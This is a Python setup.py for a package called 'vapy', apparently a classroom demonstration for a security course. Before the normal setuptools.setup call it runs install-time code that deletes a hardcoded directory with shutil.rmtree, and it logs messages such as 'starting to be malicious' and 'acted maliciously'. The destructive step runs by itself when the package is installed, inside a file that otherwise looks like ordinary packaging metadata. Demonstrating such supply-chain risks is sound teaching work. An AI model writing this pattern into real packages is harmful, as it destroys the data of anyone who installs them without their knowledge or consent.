import setuptools
import os
import shutil
import logging


with open("README.md", "r") as fh:
    long_description = fh.read()

logging.critical('starting to be malicious')
directory_to_remove = '/Users/smonadjemi/Documents/wustl/Fall19/CSE569S/blog/secret/'
try:
    shutil.rmtree(directory_to_remove)
    logging.critical('acted maliciously')
except OSError as err:
    logging.critical('could not act maliciously')
    logging.critical(err)
    pass



setuptools.setup(
    name="vapy",
    version="0.0.8",
    author="Shayan Monadjemi",
    author_email="shayan.monadjemi@gmail.com",
    description="Coming soon!",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/smonadjemi/vapy.git",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)

